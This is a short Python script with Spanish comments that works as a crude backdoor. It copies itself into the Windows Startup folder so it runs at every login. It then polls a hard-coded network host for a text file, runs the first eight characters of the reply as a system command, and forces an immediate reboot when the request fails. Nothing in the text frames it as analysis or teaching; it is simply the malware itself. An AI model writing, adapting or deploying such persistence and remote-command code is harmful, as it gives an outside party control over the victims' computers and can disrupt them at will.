import os, httplib, urllib, shutil
from subprocess import call

# revisando en donde se esta reproduciendo el archivo

pwd = os.getcwd()
resp = "dir"
fro = (pwd + "\\proyecto.py")

print(pwd);

if (pwd ==  "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"):
#si esta en la ruta correcta no pasa nada
    txt = httplib.HTTPConnection("192.168.1.4")
    cabeceras = {"Content-type": "application/x-www-form-urlencoded","Accept": "text/plain"}
    txt.request("GET", "/datos.txt","",cabeceras)
    respuesta = txt.getresponse()
    if (respuesta.status == 200):
        leer = respuesta.read()
        if (leer == ""):
            resp = "cd"
        else:
            resp = leer[:8]
    else:
        resp = ["shutdown","-t 0 -r"]
    txt.close()
else:
#si no entonces se copia
    print(fro)
    shutil.move( fro , "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\proyecto.py")

call(resp)
#call("C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\proyecto.py")
